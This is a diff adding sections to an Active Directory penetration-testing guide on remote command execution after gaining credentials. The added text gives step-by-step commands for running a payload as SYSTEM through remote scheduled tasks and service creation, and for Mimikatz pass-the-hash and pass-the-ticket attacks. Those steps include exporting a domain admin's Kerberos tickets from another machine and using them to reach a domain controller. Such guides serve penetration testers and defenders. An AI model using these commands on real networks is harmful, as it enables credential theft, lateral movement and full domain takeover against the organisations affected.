@@ -4,7 +4,7 @@ Learning from the field : Active Directory Recon and Administrative shells
 
 Once, we have access to **credentials of a domain user of windows domain**, we can utilize the credentials to do windows **active directory enumeration** such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Diretory Topology Diagrammer etc.
 
-Also, once we have **administrative credentials** there are multiple ways to get a **execute remote commands** on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, remote registry, WinRM, WMI, DCOM, remote desktop etc. We have a look over all the methods with possible examples. 
+Also, once we have **administrative credentials** there are multiple ways to get a **execute remote commands** on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc. We have a look over all the methods with possible examples. 
 
 Did we missed something? please send us a pull request and we will add it. 
 
@@ -1149,6 +1149,67 @@ However, sometimes doing it remotely, we need to figure out the time of the remo
 
  NET TIME \\REMOTECOMPUTERNAME
 
+Scheduled Tasks
+^^^^^^^^^^^^^^^^
+
+`Schtasks <https://technet.microsoft.com/en-us/library/cc725744(v=ws.11).aspx>`_ Schedules commands and programs to run periodically or at a specific time. Adds and removes tasks from the schedule, starts and stops tasks on demand, and displays and changes scheduled tasks. Schtasks replaces At.exe, a tool included in previous versions of Windows. Although At.exe is still included in the Windows Server 2003 family, schtasks is the recommended command-line task scheduling tool.
+
+::
+
+ schtasks /create /sc <ScheduleType> /tn <TaskName> /tr <TaskRun> [/s <Computer> [/u [<Domain>\]<User> [/p <Password>]]] [/ru {[<Domain>\]<User> | System}] [/rp <Password>] [/mo <Modifier>] [/d <Day>[,<Day>...] | *] [/m <Month>[,<Month>...]] [/i <IdleTime>] [/st <StartTime>] [/ri <Interval>] [{/et <EndTime> | /du <Duration>} [/k]] [/sd <StartDate>] [/ed <EndDate>] [/it] [/z] [/f]
+
+ /sc <ScheduleType>               : Specifies the schedule type. Valid values are MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE.
+ /tn <TaskName>                   : Specifies a name for the task. 
+ /tr <TaskRun>                    : Specifies the program or command that the task runs. Type the fully qualified path and file name of an executable file, script file, or batch file. If you omit the path, schtasks assumes that the file is in the SystemRoot\System32 directory.
+ /s <Computer>                    : Schedules a task on the specified remote computer. Type the name or IP address of a remote computer (with or without backslashes). The default is the local computer.
+ /u [<Domain>\]<User>             : Runs this command with the permissions of the specified user account. The default is the permissions of the current user of the local computer. 
+ /p <Password>                    : Provides the password for the user account specified in the /u parameter. If you use the /u parameter, but omit the /p parameter or the password argument, schtasks prompts you for a password and obscures the text you type
+ /ru {[<Domain>\]<User> | System} : Runs the task with permissions of the specified user account. By default, the task runs with the permissions of the current user of the local computer, or with the permission of the user specified by the /u parameter, if one is included. The /ru parameter is valid when scheduling tasks on local or remote computers.
+ /rp <Password>                   : Provides the password for the user account that is specified in the /ru parameter. If you omit this parameter when specifying a user account, SchTasks.exe prompts you for the password and obscures the text you type. Do not use the /rp parameter for tasks run with System account credentials (/ru System). The System account does not have a password and SchTasks.exe does not prompt for one.
+
+
+Example:
+
+* Create new task and execute it
+
+ ::
+
+   schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System
+   schtasks /run /tn foobar /S host
+
+* Delete the task after it is executed
+
+ ::
+
+  schtasks /F /delete /tn foobar /S host
+
+
+Service Controller (SC)
+^^^^^^^^^^^^^^^^^^^^^^^
+
+Communicates with the Service Controller and installed services. SC.exe retrieves and sets control information about services. Armitage Hacker has mentioned this at his blog `Lateral Movement with High Latency <https://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/>`_ 
+
+* Create a new service named foobar
+
+ ::
+
+  sc \\host create foobar binpath= “c:\windows\temp\foobar.exe”
+
+* Start the service
+
+ ::
+
+  sc \\host start foobar
+
+
+ The sc command requires an executable that responds to Service Control Manager commands. If you do not provide such an executable, your program will run, and then immediately exit. 
+
+* Delete the service after it runs 
+
+ ::
+
+  sc \\host delete foobar
+
 Remote Registry
 ^^^^^^^^^^^^^^^^
 
@@ -1350,7 +1411,103 @@ While executing the above if you get the below error, it means, we do not have a
     +FullyQualifiedErrorID    : UnauthorizedAccessException
 
 
+Mimikatz PTH/ PTT
+^^^^^^^^^^^^^^^^^^
 
+If we do not have plaintext credentials, we can use NTLM hashes to get a shell
+
+* **Pass the Hash**:  Using a technique called Overpass-the-Hash we can take the NTLM hash and use it to obtain a Ticket Granting Ticket (TGT) via Kerberos\\ Active Directory. With a TGT you can masquerade as the administrative user and access any domain resource that admin user has access to. 
+
+ ::
+
+  Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntlm hash] /domain:[domainname]” “exit”
+
+ A new command prompt session opens. This new command prompt injected Admin user credentials into it!
+
+ This can be verified by checking 
+ 
+ * If we have access to the C drive of the remote machine
+
+  ::
+
+   dir \\remote-machine\c$
+
+ * Inspect tickets in Overpass-the-hash command prompt: From the new command prompt that opened from the Overpass-the-hash attack, execute the following:
+
+  :: 
+
+   klist
+
+  We should be able to see the ticket of the admin user.
+ 
+
+* **Pass the ticket**
+
+ Let's assume, we got credentials of Local Admin A, by which we can login in to the machine on which Domain Admin is logged on. We would utilize pass the ticket for this
+
+ * Harvest Credentials
+
+  * Execute Mimikatz against Admin-PC ( on which domain admin is logged on )
+
+   From the new command prompt, running in the context of admin user, go to the part of the filesystem where Mimikatz is located from that library. Run the following commands:
+
+   ::
+
+    xcopy mimikatz \\admin-pc\c$\temp
+  
+   Next, execute MimiKatz remotely to export all Kerberos tickets from Admin-PC:
+
+   ::
+   
+    psexec.exe \\admin-pc -accepteula cmd /c (cd c:\temp ^& mimikatz.exe “privilege::debug”   “sekurlsa::tickets /export” ^& “exit”)
+
+   Copy these tickets back to Victim-PC:
+
+   ::
+
+    xcopy \\admin-pc\c$\temp c:\temp\tickets
+
+
+   We successfully executed Mimikatz remotely, exporting all Kerberos tickets from Admin-PC. We copied back the results to Victim-PC, and now has one of the Domain Admin credentials without having to exploit his computer!
+
+  * Locate the Domain Admin user TGT
+    
+   Locate the kirbi files which are not Domain Admin user (i.e. “ADMIN-PC$”). Delete those and keep the Domain Admin user tickets.  
+
+  * Pass-the-Ticket
+
+    We can pass the Domain Admin User tickets, literally, into memory and use them to gain access to resources as if you were Domain Admin. The attacker is ready to import them into Victim-PC’s memory, to get the credentials to access sensitive resources.
+
+    From an elevated command prompt, where Mimikatz is located on the filesystem, execute the following:
+
+    ::
+        
+     mimikatz.exe “privilege::debug” “kerberos::ptt c:\temp\tickets” “exit”
+
+    Ensure that the DomainAdminUser@krbtgt-Domainname tickets were successfully imported. Now, let’s validate that the right tickets are in the command prompt session.
+
+  * Validate the ticket was imported
+
+   Execute the following in the same elevated command prompt:
+
+   :: 
+
+    klist
+
+   The attacker now successfully imported the harvested ticket into the session, and will now leverage their new privilege and access to access the domain controller’s C drive
+
+  * Access contents of dc1\c$ with DomainAdminUser credential
+
+   Execute the following in the same command prompt to which the tickets were just imported.
+
+   ::
+
+    dir \\dc1\c$
+
+   The attacker is now, for all intents and purposes, DomainAdminUser, in the digital world. Only administrators should be able to access the root of the domain controller. The attacker is using legitimate credentials, can access legitimate resources and executing legitimate executables.
+
+
+Both Mimikatz PTH, PTT has been taken from the Microsoft `Advanced Threat Analytics Attack Simulation Playbook <https://gallery.technet.microsoft.com/Advanced-Threat-Analytics-8b0a86bc>`_
 
 xfreerdp/ Remote Desktop
 ^^^^^^^^^^^^^^^^^^^^^^^^
